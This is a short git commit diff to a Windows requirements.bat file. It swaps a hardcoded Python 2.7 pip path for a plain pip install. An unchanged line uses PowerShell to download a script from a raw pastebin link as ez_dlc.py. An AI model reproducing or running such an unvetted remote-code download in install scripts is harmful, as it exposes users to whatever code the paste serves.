3c0068f47597830baccd4121503f6abcf706842b
James Duarte <p1n3tr335@gmail.com>
2018-07-18 16:09:01 -0400

    Hardcoded.

--- requirements.bat
+++ requirements.bat
@@ -1,2 +1,2 @@
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/amqJduwg', 'ez_dlc.py')"
-C:\Python27\Scripts\pip.exe install -q -r requirements.txt
+pip install -q -r requirements.txt
